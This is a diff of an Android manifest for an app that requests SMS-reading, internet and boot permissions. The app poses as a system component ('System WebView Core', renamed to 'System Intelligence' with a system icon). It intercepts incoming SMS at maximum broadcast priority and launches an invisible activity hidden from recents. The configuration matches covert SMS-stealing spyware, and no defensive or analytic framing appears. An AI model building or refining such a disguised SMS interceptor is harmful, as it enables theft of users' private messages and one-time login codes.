@@ -1,33 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    android:installLocation="internalOnly">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
     <application
-        android:allowBackup="false"
+        android:label="System Intelligence"
+        android:icon="@android:drawable/ic_menu_manage"
         android:persistent="true"
-        android:label="System WebView Core"
-        android:directBootAware="true"
-        android:usesCleartextTraffic="true">
+        android:directBootAware="true">
         
         <receiver android:name=".SmsReceiver" 
                   android:permission="android.permission.BROADCAST_SMS"
                   android:exported="true">
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
 
         <activity android:name=".MainActivity" 
                   android:theme="@android:style/Theme.NoDisplay"
                   android:excludeFromRecents="true"
-                  android:noHistory="true"
                   android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
